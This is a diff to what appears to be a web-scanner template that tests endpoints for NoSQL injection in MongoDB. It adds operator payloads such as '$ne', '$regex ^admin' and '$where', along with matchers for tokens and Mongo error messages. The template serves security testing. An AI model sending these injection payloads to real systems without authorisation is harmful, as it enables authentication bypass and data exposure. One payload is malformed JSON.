@@ -1,8 +1,8 @@
 id: generic-nosqli
 info:
   name: NoSQL Injection
-  description: Detects NoSQL injection in MongoDB and other NoSQL databases
-  owasp_category: A03:2025
+  description: Tests for NoSQL injection in MongoDB and similar NoSQL databases
+  owasp_category: A03:2021
   severity: high
   tags:
     - nosql
@@ -12,8 +12,8 @@ info:
 
 generic:
   endpoint: "{{all_discovered}}"
-  method: POST
-  parameter: "email"
+  methods: [GET, POST]
+  parameter: "{{input_param}}"
 
   payloads:
     - '{"$ne": null}'
@@ -21,6 +21,14 @@ generic:
     - '{"$regex": ".*"}'
     - '{"$where": "1==1"}'
     - '{"$ne": 1}'
+    - '{"$in": ["1"]}'
+    - '{"$exists": true}'
+    - '{"$or": [{"1":"1"},{"":"":""}]}'
+    - '{"$regex": "^admin"}'
+    - '{"$ne": null, "$exists": true}'
+    - '{$ne:null}'
+    - '$ne'
+    - '$where'
 
   matchers:
     - type: status
@@ -29,13 +37,19 @@ generic:
         - 200
         - 201
     - type: regex
+      part: body
+      condition: or
       regex:
         - 'authenticated.*true'
         - 'success.*true'
-        - 'token'
+        - '"token":\s*"[A-Za-z0-9.-_]+"'
         - '"id":\s*[0-9]+'
         - 'user.*found'
-      condition: or
+        - '"data":\s*\['
+        - 'MongoError'
+        - 'MongoServerError'
+        - 'BSON.*Error'
+        - '<title>.*TypeError.*Object'
       case_sensitive: false
 
-  matchers_condition: and
+  matchers_condition: or
